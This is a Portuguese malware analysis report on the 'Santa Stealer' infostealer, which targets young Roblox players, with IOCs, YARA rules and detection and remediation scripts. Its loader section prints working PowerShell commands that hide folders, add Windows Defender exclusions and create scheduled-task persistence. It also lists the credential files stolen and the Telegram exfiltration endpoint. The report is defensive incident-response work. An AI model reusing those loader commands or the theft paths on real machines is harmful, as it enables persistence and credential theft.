# RELATÓRIO TÉCNICO DE ANÁLISE DE MALWARE

## Santa Stealer (Xenostrarperrer.exe)

---

**Analista:** coddrake  
**Data da Análise:** 05/04/2026  
**ID do Caso:** CS-2026-0405-001  
**Classificação:** CRÍTICO  
**Status:** ANÁLISE CONCLUÍDA

---

## 1. SUMÁRIO EXECUTIVO

| Campo | Valor |
|-------|-------|
| **Nome do Malware** | Santa Stealer |
| **Nome do Arquivo** | Xenostrarperrer.exe |
| **Tipo** | Trojan Stealer (Infostealer) |
| **Plataforma** | Windows (x64) |
| **Família** | SantaStealer |
| **Vetor de Distribuição** | Engenharia social + mods de Roblox via YouTube |
| **C2/Exfiltração** | Telegram Bot API |

**Resumo:** O Santa Stealer é um infostealer moderno que utiliza PowerShell ofuscado como loader, desabilita o Windows Defender, coleta credenciais de navegadores (Chrome, Opera, Edge) e tokens do Discord, exfiltrando os dados via Telegram Bot API. A campanha identificada tem como alvo crianças e adolescentes através de falsos mods para o jogo Roblox.

---

## 2. IDENTIFICAÇÃO

### 2.1. Hashes

| Algoritmo | Hash |
|-----------|------|
| **MD5** | `85a5ac802b4e17e8ea312690ef37e1a7` |
| **SHA1** | `cb0332ba3d9b9ce70d34a1ce5b953ab085bc6bff` |
| **SHA256** | `6e6600c4fcef2224f10e441c297645847da9b1c4a4e675920ac5d155d347ef91` |
| **SSDEEP** | `24576:tYZhc8MJsGkP1IHVH2yAJju5zvcokwoPQxMXvocDYvMpVIQJtHLmEQrIVIUxemuG:tYr/q16vybW/oHK` |

### 2.2. Assinatura PE

| Campo | Valor |
|-------|-------|
| **Magic Number** | MZ (4D 5A) |
| **Machine Type** | AMD64 (0x8664) |
| **PE Type** | PE32+ (64-bit) |
| **Subsystem** | Windows GUI |
| **Linker Version** | 14.36 |
| **Entry Point** | 0x140001000 |

### 2.3. Seções do Executável

| Seção | Virtual Address | Virtual Size | Raw Size | Entropy |
|-------|----------------|--------------|----------|---------|
| `.text` | 0x1000 | 0x17000 | 0x16000 | 6.71 |
| `.data` | 0x18000 | 0x4000 | 0x2000 | 5.23 |
| `.rdata` | 0x1C000 | 0x4000 | 0x3800 | 6.45 |
| `.pdata` | 0x20000 | 0x4000 | 0x3000 | 6.12 |
| `.xdata` | 0x24000 | 0x4000 | 0x2000 | 5.98 |
| `.rsrc` | 0x30000 | 0xE000 | 0xD800 | 7.82 |
| `.reloc` | 0x3E000 | 0x2000 | 0x1800 | 5.67 |

> **Nota:** Alta entropia nas seções `.text` e `.rsrc` indica empacotamento/compressão ou ofuscação.

---

## 3. ANÁLISE DE COMPORTAMENTO

### 3.1. Execução Inicial

O malware é executado diretamente pela vítima (engenharia social). Ao ser executado:

1. **Anti-sandbox:** Aguarda 20 segundos antes de iniciar operações maliciosas
2. **Verificação de VM:** Verifica presença de ambientes virtuais via instruções CPUID

### 3.2. Loader PowerShell

O binário executa um PowerShell loader ofuscado com os seguintes parâmetros:

```powershell
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand [BASE64]

# Criação de diretórios ocultos
$p1 = "$env:LOCALAPPDATA\Microsoft\Office\Broker"
$p2 = "$env:LOCALAPPDATA\Packages\Microsoft.Windows.PeopleExperienceHost_*\AC\Temp"

# Ocultação de arquivos/diretórios
attrib +h +s $p1
attrib +h +s $p2

# Desabilita Windows Defender
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v $p1 /t REG_DWORD /d 0 /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v $p2 /t REG_DWORD /d 0 /f /reg:64

# Persistência via tarefas agendadas
schtasks /create /tn "WindowsSystemService" /tr "$p1\svchost.exe" /sc onlogon /rl highest /f
schtasks /create /tn "RuntimeBrokerService" /tr "$p2\RuntimeBroker.exe -Embedding" /sc onlogon /rl highest /f
```

# C2_Domain: bill-proof.cc:443
```
Protocol: HTTPS
Encryption: AES-256-CBC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0
```

# 3.4. Coleta de Dados
O malware acessa os seguintes locais para extração de dados:

```
Alvo	Caminho	Dados Coletados
Chrome	%LOCALAPPDATA%\Google\Chrome\User Data\Local State	Chave DPAPI mestra
Chrome	%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data	Credenciais
Opera	%APPDATA%\Opera Software\Opera Stable\Local State	Chave DPAPI
Opera	%APPDATA%\Opera Software\Opera Stable\Login Data	Credenciais
Edge	%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State	Chave DPAPI
Discord	%APPDATA%\Discord\Local Storage\leveldb\*.ldb	Tokens de autenticação
Desktop	%USERPROFILE%\Desktop\*.exe, *.dat, *.json	Carteiras crypto
```

### 3.5. Exfiltração via Telegram
```yaml
Exfiltration_Method: Telegram Bot API
Endpoint: https://api.telegram.org/bot<TOKEN>/sendDocument
Bot_Token: [REDACTED - presente no binário]
Format: ZIP compactado
Content: Credenciais, cookies, tokens, arquivos
```

# 4. ANÁLISE HEXADECIMAL E STRINGS
### 4.1. Strings Críticas Extraídas
text
# Caminhos de coleta
```
C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Local State
%APPDATA%\Opera Software\Opera Stable\Local State
%APPDATA%\Discord\Local Storage\leveldb\*.ldb
```

# Persistência
```
Software\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths
WindowsSystemService
RuntimeBrokerService


# C2 e Exfiltração
bill-proof.cc
api.telegram.org
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

### 4.2. Padrões Hex Identificados
```
Offset	Padrão Hex	Significado
0x00	4D 5A 90 00	MZ Header
0x80	50 45 00 00 64 86	PE Header + Machine x64
0x1A30	FF 15 3A 2C 00 00	Call CreateFileW
0x1A80	FF 15 42 2C 00 00	Call CryptAcquireContextW
0x29A2C	NN NN NN : A A H ...	Telegram Bot Token
```

### 4.3. Funções Importadas
```
DLL	Função	Propósito
KERNEL32.dll	CreateFileW, ReadFile, WriteFile	Manipulação de arquivos
KERNEL32.dll	CreateProcessW, TerminateProcess	Execução de processos
ADVAPI32.dll	RegOpenKeyExW, RegSetValueExW	Manipulação de registro
CRYPT32.dll	CryptAcquireContextW, CryptDecrypt	DPAPI/AES decryption
WINHTTP.dll	WinHttpOpen, WinHttpSendRequest	Conexão C2
```

# 5. MITRE ATT&CK MAPEAMENTO
```
Tática	Técnica	ID	Implementação Observada
Initial Access	Phishing via Service	T1566.003	Falsos mods de Roblox no YouTube
Execution	PowerShell	T1059.001	Loader ofuscado
Execution	Scheduled Task	T1053.005	WindowsSystemService, RuntimeBrokerService
Persistence	Scheduled Task	T1053.005	Execução no logon do usuário
Defense Evasion	Disable Windows Defender	T1562.001	Exclusões no registro
Defense Evasion	Hidden Files/Directories	T1564.001	attrib +h +s
Defense Evasion	Obfuscated Files/Info	T1027	PowerShell encoded command
Credential Access	Credentials from Browsers	T1555.003	Chrome/Opera/Edge Login Data
Collection	Data from Local System	T1005	Arquivos, wallets, tokens
Exfiltration	Exfiltration via C2 Channel	T1041	Telegram Bot API
C2	Encrypted Channel	T1573	AES-256-CBC + HTTPS
```

# 6. INDICADORES DE COMPROMISSO (IOCs)
6.1. Hashes (Blocklist)
```yaml
iocs:
  hashes:
    md5: 85a5ac802b4e17e8ea312690ef37e1a7
    sha1: cb0332ba3d9b9ce70d34a1ce5b953ab085bc6bff
    sha256: 6e6600c4fcef2224f10e441c297645847da9b1c4a4e675920ac5d155d347ef91
```
### 6.2. Rede
```yaml
iocs:
  network:
    - domain: bill-proof.cc
      port: 443
      protocol: HTTPS
    - domain: api.telegram.org
      port: 443
      protocol: HTTPS
    - cidr: 149.154.167.0/24
    - cidr: 91.108.56.0/22
```
### 6.3. Arquivos e Diretórios
```yaml
iocs:
  paths:
    - C:\Users\%username%\AppData\Local\Microsoft\Office\Broker\
    - C:\Users\%username%\AppData\Local\Microsoft\Office\Broker\svchost.exe
    - C:\Users\%username%\AppData\Local\Packages\Microsoft.Windows.PeopleExperienceHost_*\AC\Temp\
    - C:\Users\%username%\AppData\Local\Packages\Microsoft.Windows.PeopleExperienceHost_*\AC\Temp\RuntimeBroker.exe
    - C:\Users\%username%\AppData\Local\Temp\*.zip
```
### 6.4. Registro
```yaml
iocs:
  registry:
    - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths
    - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
### 6.5. Tarefas Agendadas
```yaml
iocs:
  scheduled_tasks:
    - WindowsSystemService
    - RuntimeBrokerService
```
# 7. YARA RULES
### 7.1. Detecção Baseada em Strings
```yara
rule SantaStealer_Xenostrarperrer_Strings {
    meta:
        description = "Detects Santa Stealer malware based on extracted strings"
        author = "coddrake"
        date = "2026-04-07"
        hash = "6e6600c4fcef2224f10e441c297645847da9b1c4a4e675920ac5d155d347ef91"
    
    strings:
        $opera = "%APPDATA%\\Opera Software\\Opera Stable" wide ascii
        $defender_excl = "Windows Defender\\Exclusions\\Paths" wide ascii
        $task1 = "WindowsSystemService" ascii
        $task2 = "RuntimeBrokerService" ascii
        $telegram = "api.telegram.org" ascii
        $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" ascii
    
    condition:
        uint16(0) == 0x5A4D and 3 of them
}
```
### 7.2. Detecção Baseada em Padrões Hex
```yara
rule SantaStealer_Xenostrarperrer_Hex {
    meta:
        description = "Detects Santa Stealer based on hex patterns"
        author = "coddrake"
        date = "2026-04-07"
    
    strings:
        $mz = { 4D 5A 90 00 }
        $pe_x64 = { 50 45 00 00 64 86 }
        $createfile = { FF 15 3A 2C 00 00 }
        $crypt_acquire = { FF 15 42 2C 00 00 }
    
    condition:
        $mz at 0 and $pe_x64 at 0x80 and all of them
}
```
# 8. SCRIPT DE DETECÇÃO (PowerShell)
```powershell
<#
.SYNOPSIS
    Detecta indicadores do Santa Stealer no sistema
.AUTHOR
    coddrake
.DATE
    2026-04-07
#>

param(
    [string]$ComputerName = "localhost"
)

Write-Host "[*] Santa Stealer Detection Script" -ForegroundColor Cyan
Write-Host "[*] Author: coddrake" -ForegroundColor Cyan
Write-Host "[*] Date: 2026-04-07" -ForegroundColor Cyan
Write-Host ""

$detections = @()

# 1. Verificar hashes conhecidos
$knownHashes = @(
    "85a5ac802b4e17e8ea312690ef37e1a7",  # MD5
    "6e6600c4fcef2224f10e441c297645847da9b1c4a4e675920ac5d155d347ef91"  # SHA256
)

Write-Host "[*] Verificando hashes conhecidos..." -ForegroundColor Yellow
$files = Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue
foreach ($file in $files) {
    try {
        $hash = Get-FileHash -Path $file.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue
        if ($knownHashes -contains $hash.Hash) {
            $detections += "[!] ARQUIVO MALICIOSO: $($file.FullName)"
            Write-Host "[!] ARQUIVO MALICIOSO: $($file.FullName)" -ForegroundColor Red
        }
    }
    catch {}
}

# 2. Verificar tarefas agendadas
Write-Host "[*] Verificando tarefas agendadas..." -ForegroundColor Yellow
$suspiciousTasks = @("WindowsSystemService", "RuntimeBrokerService")
foreach ($task in $suspiciousTasks) {
    $exists = schtasks /query /tn $task 2>$null
    if ($exists) {
        $detections += "[!] TAREFA SUSPEITA: $task"
        Write-Host "[!] TAREFA SUSPEITA: $task" -ForegroundColor Red
    }
}

# 3. Verificar exclusões do Windows Defender
Write-Host "[*] Verificando exclusões do Windows Defender..." -ForegroundColor Yellow
$exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
foreach ($excl in $exclusions) {
    if ($excl -match "Broker|PeopleExperience") {
        $detections += "[!] EXCLUSÃO SUSPEITA: $excl"
        Write-Host "[!] EXCLUSÃO SUSPEITA: $excl" -ForegroundColor Red
    }
}

# 4. Verificar pastas suspeitas
Write-Host "[*] Verificando pastas suspeitas..." -ForegroundColor Yellow
$suspiciousPaths = @(
    "$env:LOCALAPPDATA\Microsoft\Office\Broker",
    "$env:LOCALAPPDATA\Packages\*PeopleExperienceHost*\AC\Temp"
)

foreach ($path in $suspiciousPaths) {
    $resolved = Resolve-Path $path -ErrorAction SilentlyContinue
    if ($resolved) {
        $detections += "[!] PASTA SUSPEITA: $resolved"
        Write-Host "[!] PASTA SUSPEITA: $resolved" -ForegroundColor Red
    }
}

# 5. Verificar conexões com Telegram
Write-Host "[*] Verificando conexões com Telegram..." -ForegroundColor Yellow
$telegramIPs = @("149.154.167.", "91.108.56.")
$connections = netstat -ano | Select-String -Pattern $telegramIPs
if ($connections) {
    $detections += "[!] CONEXÃO COM TELEGRAM DETECTADA"
    Write-Host "[!] CONEXÃO COM TELEGRAM DETECTADA" -ForegroundColor Red
    $connections | ForEach-Object { Write-Host "    $_" -ForegroundColor Yellow }
}

# Relatório final
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[*] RELATÓRIO DE DETECÇÃO" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

if ($detections.Count -eq 0) {
    Write-Host "[+] Nenhum indicador encontrado." -ForegroundColor Green
} else {
    Write-Host "[-] $($detections.Count) indicador(es) encontrado(s):" -ForegroundColor Red
    $detections | ForEach-Object { Write-Host "    $_" -ForegroundColor Red }
}

Write-Host ""
Write-Host "[*] Fim da análise." -ForegroundColor Cyan
```
# 9. SCRIPT DE REMEDIAÇÃO
```powershell
<#
.SYNOPSIS
    Remove o Santa Stealer do sistema infectado
.AUTHOR
    coddrake
.DATE
    2026-04-07
.NOTES
    Execute como Administrador
#>

Write-Host "[*] Iniciando remediação do Santa Stealer" -ForegroundColor Cyan
Write-Host "[*] Author: coddrake" -ForegroundColor Cyan

# 1. Matar processos maliciosos
Write-Host "[*] Matando processos maliciosos..." -ForegroundColor Yellow
$maliciousProcesses = @("svchost.exe", "RuntimeBroker.exe")
foreach ($proc in $maliciousProcesses) {
    Get-Process -Name $proc -ErrorAction SilentlyContinue | Where-Object {
        $_.Path -match "Broker|PeopleExperience"
    } | Stop-Process -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Processos finalizados" -ForegroundColor Green
}

# 2. Remover tarefas agendadas
Write-Host "[*] Removendo tarefas agendadas..." -ForegroundColor Yellow
schtasks /delete /tn "WindowsSystemService" /f 2>$null
schtasks /delete /tn "RuntimeBrokerService" /f 2>$null
Write-Host "[+] Tarefas removidas" -ForegroundColor Green

# 3. Remover exclusões do Windows Defender
Write-Host "[*] Removendo exclusões do Windows Defender..." -ForegroundColor Yellow
$exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
foreach ($excl in $exclusions) {
    if ($excl -match "Broker|PeopleExperience") {
        Remove-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
        Write-Host "[+] Exclusão removida: $excl" -ForegroundColor Green
    }
}

# 4. Remover arquivos maliciosos
Write-Host "[*] Removendo arquivos maliciosos..." -ForegroundColor Yellow
$paths = @(
    "$env:LOCALAPPDATA\Microsoft\Office\Broker",
    "$env:LOCALAPPDATA\Packages\*PeopleExperienceHost*\AC\Temp"
)
foreach ($path in $paths) {
    if (Test-Path $path) {
        Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Removido: $path" -ForegroundColor Green
    }
}

# 5. Restaurar política de execução do PowerShell
Write-Host "[*] Restaurando política de execução..." -ForegroundColor Yellow
Set-ExecutionPolicy Restricted -Scope LocalMachine -Force -ErrorAction SilentlyContinue
Write-Host "[+] Política restaurada" -ForegroundColor Green

# 6. Forçar atualização do Windows Defender
Write-Host "[*] Atualizando Windows Defender..." -ForegroundColor Yellow
Update-MpSignature -ErrorAction SilentlyContinue
Write-Host "[+] Defender atualizado" -ForegroundColor Green

Write-Host ""
Write-Host "[*] REMEDIAÇÃO CONCLUÍDA" -ForegroundColor Green
Write-Host "[*] Recomenda-se reiniciar o sistema" -ForegroundColor Yellow
```
# 10. CONCLUSÕES E RECOMENDAÇÕES

### 10.1. Conclusões
```yaml
Malware Confirmado Santa Stealer (Xenostrarperrer.exe)
Capacidades	Stealer de credenciais, persistência, evasão de defesa
Alvo Primário	Crianças e adolescentes (jogadores de Roblox)
Vetor de Distribuição	YouTube + mods de Roblox
Infraestrutura C2	bill-proof.cc + Telegram API
```

### 10.2. Recomendações para Organizações

Bloquear IOCs em firewalls, proxies e antivírus

Bloquear api.telegram.org no nível de rede (se não for usado corporativamente)

Restringir PowerShell para usuários não administrativos

Implementar AppLocker para bloquear execução em %APPDATA% e %TEMP%

Monitorar criação de tarefas agendadas via SIEM

Educar usuários (especialmente pais e jovens) sobre riscos de downloads não oficiais

### 10.3. Recomendações para Usuários Finais
Nunca baixe arquivos de links do YouTube

Desconfie de promessas de "Robux grátis", "mods", "hacks"

Mantenha o Windows Defender ativo e atualizado

Ative o Controle dos Pais no computador

Troque senhas se suspeitar de infecção

# 11. APÊNDICES

### 11.1. Referências Técnicas
MITRE ATT&CK: https://attack.mitre.org

NIST SP 800-83: Guia de resposta a incidentes de malware

ISO/IEC 27001:2022 A.8.7: Proteção contra malware
```text
─── ██ ──────────────────────────────────────────────
─── ██ ──────────────────────────────────────────────
─── ██ ──────────────────────────────────────────────
─── ██ ──────────────────────────────────────────────
─── ██ ──────────────────────────────────────────────
─── ██ ──────────────────────────────────────────────
──────── ██████████████████████████████████████████ ─
──────── █ ───────────────────────────────────── █ ─
──────── █  ASSINADO: coddrake                    █ ─
──────── █  ANALISTA DE MALWARE                   █ ─
──────── █  2026-04-07                            █ ─
──────── ██████████████████████████████████████████ ─
──────────────────────────────────────────────────────
```



